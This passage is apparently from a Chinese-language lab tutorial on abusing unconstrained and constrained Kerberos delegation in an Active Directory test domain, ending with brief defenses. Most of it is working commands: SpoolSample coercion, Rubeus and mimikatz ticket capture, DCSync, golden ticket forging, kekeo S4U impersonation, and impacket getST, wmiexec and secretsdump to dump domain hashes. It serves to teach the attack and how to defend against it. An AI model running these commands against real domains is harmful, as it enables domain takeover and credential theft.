  * 域控：系统：`Windows server 2012R2`主机名：`DM2012`，ip：`192.168.141.134`
  * 域内主机：系统：`windows 10`，主机名：`win10`，ip：`192.168.141.165`
这个实现了前提是：需要获取一台主机账户开启了非约束委派域内机器的权限
我们给win10这个主机账户开启非约束委派
**注** ：是主机账户开启非约束委派，而不是服务用户
`tifkin_`在他的github上开源了POC：
向DM2012的`Spooler`服务发送请求，强制其访问win10进行身份验证
    SpoolSample.exe dm2012 win10
我们可以用`Rubeus`来监听`Event ID`为`4624`事件，这样可以第一时间截取到域控的TGT
每隔一秒监听一次来自`dm2012`的登陆（需要本地管理员权限）
    Rubeus.exe monitor /interval:1 /filteruser:dm2012$
**注** ：Rubeus.exe捕获到的TGT是base64编码的，但是我们不需要解码，`Rubeus`可以直接将base64编码的票据直接注入到内存中
    Rubeus.exe ptt /ticket:base64
因为之前域内主机win10的安全日志被我搞崩了，所以这里就不演示了
因为我们Rubeus监听TGT用不了，所以我们可以用`mimikatz`导出TGT
    privilege::debug
    sekurlsa::tickets /export
可以发现成功导出来自`DM2012$`的TGT
得到TGT之后，我们用ptt将票据注入到当前会话后，可以用`dcsync`导出域控中所有用户的hash，然后用`krbtgt`用户的hash生成黄金票据
    kerberos::ptt [0;862bdd]-2-0-60a10000-DM2012$@krbtgt-TEST.LOCAL.kirbi
    lsadump::dcsync /domain:test.local /all /csv
得到`krbtgt`用户的hash之后生成一张administrator的黄金票据
    kerberos::golden /user:Administrator /domain:test.local /sid:S-1-5-21-662417213-3583657854-423750704 /krbtgt:683545df56ea57b168d0ad090e209616 /ptt
成功以administrator的身份访问域控
执行命令可以用`WinRM`服务来远程连接域控
关于`Spooler`服务的利用还有`CVE-2019-1040`，不过这个是基于资源的约束委派，有兴趣的同学可以去了解一下
## 约束委派的利用
### 概述
由于非约束委派的不安全性，微软在`windows server
2003`中引入了约束委派，对Kerberos协议进行了拓展，引入了`S4U`，其中`S4U`支持两个子协议：`Service for User to
Self (S4U2Self)`和 `Service for User to Proxy
(S4U2proxy)`，这两个扩展都允许服务代表用户从KDC请求票证。`S4U2self`可以代表自身请求针对其自身的Kerberos服务票据(ST)；`S4U2proxy`可以以用户的名义请求其它服务的ST，约束委派就是限制了`S4U2proxy`扩展的范围。
`S4U2Self`和`S4U2proxy`的请求过程（图来自微软手册）：
**注** ：其中步骤1-4代表`S4U2Self`请求的过程，步骤5-10代表`S4U2proxy`的请求过程
上述请求的文字描述：
    1. 用户向service1发出请求。用户已通过身份验证，但service1没有用户的授权数据。通常，这是由于身份验证是通过Kerberos以外的其他方式验证的。
    2. 通过S4U2self扩展以用户的名义向KDC请求用于访问service1的ST1。
    3. KDC返回给Service1一个用于用户验证Service1的ST1，该ST1可能包含用户的授权数据。
    4. service1可以使用ST中的授权数据来满足用户的请求，然后响应用户。
    注：尽管S4U2self向service1提供有关用户的信息，但S4U2self不允许service1代表用户发出其他服务的请求，这时候就轮到S4U2proxy发挥作用了
    5. 用户向service1发出请求，service1需要以用户身份访问service2上的资源。
    6. service1以用户的名义向KDC请求用户访问service2的ST2
    7. 如果请求中包含PAC，则KDC通过检查PAC的签名数据来验证PAC ，如果PAC有效或不存在，则KDC返回ST2给service1，但存储在ST2的cname和crealm字段中的客户端身份是用户的身份，而不是service1的身份。
    8. service1使用ST2以用户的名义向service2发送请求，并判定用户已由KDC进行身份验证。
    9. service2响应步骤8的请求。
    10. service1响应用户对步骤5中的请求。
### 操作
操作环境：
  * 域：`qiyou.com`
  * 域内主机：`windows server 2012R2`，主机名：`DM2012`，IP：`192.168.141.134`，用户：`qiyou`
  * 域内主机：`DM08`
`DM08`是域内的另外一台主机，下面我们设置了服务用户`qiyou`对`DM08`的`cifs`服务的委派
概述那里我们讲了在约束委派的情况下，服务用户只能获取某个用户（或主机）的服务的ST，所以只能模拟用户访问特定的服务，是无法获取用户的TGT，如果我们能获取到开启了约束委派的服务用户的明文密码或者`NTLM
Hash`，我们就可以伪造S4U请求，进而伪装成服务用户以 **任意账户** 的权限申请访问某服务的ST
已经知道服务用户明文的条件下，我们可以用kekeo请求该用户的TGT
    tgt::ask /user:qiyou /domain:qiyou.com /password:password /ticket:test.kirbi
参数：
`/user`: 服务用户的用户名
`/password`: 服务用户的明文密码
`/domain`: 所在域名
`/ticket`: 指定票据名称，不过这个参数没有生效，可以忽略
得到服务用户TGT：`PI:EMAIL_krbtgt~PI:EMAIL`
然后我们可以使用这张TGT通过伪造s4u请求以`administrator`用户身份请求访问`dm08 CIFS`的ST
    tgs::s4u /tgt:PI:EMAIL_krbtgt~PI:EMAIL /user:PI:EMAIL /service:cifs/dm08.qiyou.com
`S4U2Self`获取到的ST1以及`S4U2Proxy`获取到的dm08 CIFS服务的ST2会保存在当前目录下
然后我们用mimikatz将ST2导入当前会话即可
    kerberos::ptt PI:EMAIL@QIYOU.COM_cifs~PI:EMAIL
成功访问到dm08的cifs服务
上面是知道服务用户明文的情况下，kekeo同样也支持使用`NTLM Hash`
在请求服务用户的TGT那步直接把`/password`改成`/NTLM`即可
已知我们服务账号`qiyou`的`NTLM hash`是`b4f27a13d0f78d5ad83750095ef2d8ec`
    tgt::ask /user:qiyou /domain:qiyou.com /NTLM:b4f27a13d0f78d5ad83750095ef2d8ec
    tgs::s4u /tgt:PI:EMAIL_krbtgt~PI:EMAIL /user:PI:EMAIL /service:cifs/dm08.qiyou.com
    kerberos::ptt PI:EMAIL@QIYOU.COM_cifs~PI:EMAIL
如果我们不知道服务用户的明文和NTLM
Hash，但是我们有了服务用户登陆的主机权限（需要本地管理员权限），我们可以用`mimikatz`直接从内存中把服务用户的TGT dump出来
    mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit
**注**
：`sekurlsa::tickets`是列出和导出所有会话的`Kerberos`票据，`sekurlsa::tickets`和`kerberos::list`不同，sekurlsa是从内存读取，也就是从lsass进程读取，这也就是为什么`sekurlsa::tickets
/export`需要管理员权限的原因。并且`sekurlsa::tickets`的导出不受密钥限制，sekurlsa可以访问其他会话（用户）的票证。
既然服务用户的TGT导出来了，我们就跳过`tgt::ask`请求TGT这步，直接`tgs::s4u`
    tgs::s4u /tgt:[0;196b1e4]PI:EMAIL /user:PI:EMAIL /service:cifs/dm08.qiyou.com
    kerberos::ptt PI:EMAIL@QIYOU.COM_cifs~PI:EMAIL
我们来抓包看一下整个委派请求的过程
可以看到有6个请求响应的过程，我们可以分为3步来分析
  1. 可以看到用户`qiyou`首先向KDC请求一张TGT，`AS-REP`请求里返回TGT，这张TGT代表的是qiyou这个用户
2 然后用这张`TGT`发送`S4U2self`请求，以`Administrator`的名义向`TGS`申请了一张访问自身服务的票据，我们这里就称为ST1吧
  1. 得到`ST1`之后，然后会带上ST1再次向`KDC`发起`SU42Proxy`请求，以`administrator`的名义请求一张访问`DM08 cifs`服务的票据，我们这里就称为`ST2`吧
上述数据包请求过程中：第一步对应的是我们kekeo的`tgt::ask`；2-3是对应`tgs::s4u`，其中ST1和ST2分别对应的就是kekeo生成的`PI:EMAIL@PI:EMAIL`和`PI:EMAIL@QIYOU.COM_cifs~PI:EMAIL`，不过我们最终用到是ST2，ST1可以看作一个中间产物。
得到ST2之后我们就可以回到我们的攻击机上进行ptt就能得到`DM08 cifs`的访问权限了
### 利用约束委派生成黄金票据
操作环境：
  * 域：`qiyou.com`
  * 域控：`windows server 2008R2`，主机名：`WIN-QFPHJSM1L7G`，IP：`192.168.141.145`，用户：`administrator`
  * 域内主机：`windows server 2012R2`，主机名：`DM2012`，IP：`192.168.141.134`，用户：`qiyou`
我们都知道TGT的生成是由`krbtgt`用户加密和签名的，如果我们能委派域上的用户去访问`TGS`，那么就可以伪造任意用户的TGT了，黄金票据通常情况下我们是用`krbtgt`的hash来伪造TGT，不过我们通过约束委派也能达到同样的效果。
**注** ：`TGS`默认的spn是`krbtgt/domain name`，我们操作环境是`krbtgt/QIYOU.COM`
`krbtgt`默认是禁用的而且无法启用，所以我们无法使用界面来添加这个SPN。
我们可以使用powershell来添加
    Import-Module ActiveDirectory
    $user = Get-ADUser qiyou
    Set-ADObject $user -Add @{ "msDS-AllowedToDelegateTo" = @("krbtgt/qiyou.com") }
**注**
：域控默认安装ActiveDirectory，如果没有安装，可以下载dll：[下载地址](https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll)，然后导入就行了：`import-module .\Microsoft.ActiveDirectory.Management.dll`
GUI界面查看一下，成功添加
我们可以用`impacket`系列的`getST`向KDC请求administrator的TGT
    getst.exe -dc-ip 192.168.141.145 -spn krbtgt/qiyou.com -impersonate Administrator qiyou.com/qiyou:password
参数：
-impersonate：表示伪造用户
-spn：表示我们要委派的服务的spn，这里是TGS
-dc-ip：域控ip
执行之后会在当前目录生成一个缓存文件`Administrator.ccache`
然后用mimikatz进行`ptc`（pass the cache），将缓存注入当前会话中
klist查看缓存的票据
访问域控
执行命令的话我们可以用`impacket`系列或者`powershell`都可以
wmiexec
    set KRB5CCNAME=Administrator.ccache
    wmiexec.exe -no-pass -k PI:EMAIL -dc-ip 192.168.141.145
导出域控上所有用户以及主机的hash
    set KRB5CCNAME=Administrator.ccache
    secretsdump.exe -no-pass -k WIN-QFPHJSM1L7G.qiyou.com
请求过程和上面的cifs是一样的只不过是把cifs换krbtgt而已，所以这里就不抓包演示了
## 防御
  1. 高权限用户没有在特殊要求之下设置为不可委派
如图
  1. 为了防止凭据被盗微软推出了`Protected Users`组，适用于`Windows Server 2016`，`Windows Server 2012 R2`、 `Windows Server 2012`
关于`Protected Users`组成员的特点请参考微软[手册](https://docs.microsoft.com/zh-cn/windows-server/identity/ad-ds/manage/how-to-configure-protected-accounts#BKMK_AddtoProtectedUsers)，这里就不多赘述了
  1. 提高服务用户密码强度，防止黑客通过`Kerberoasting`等手段对口令进行暴力破解
## Reference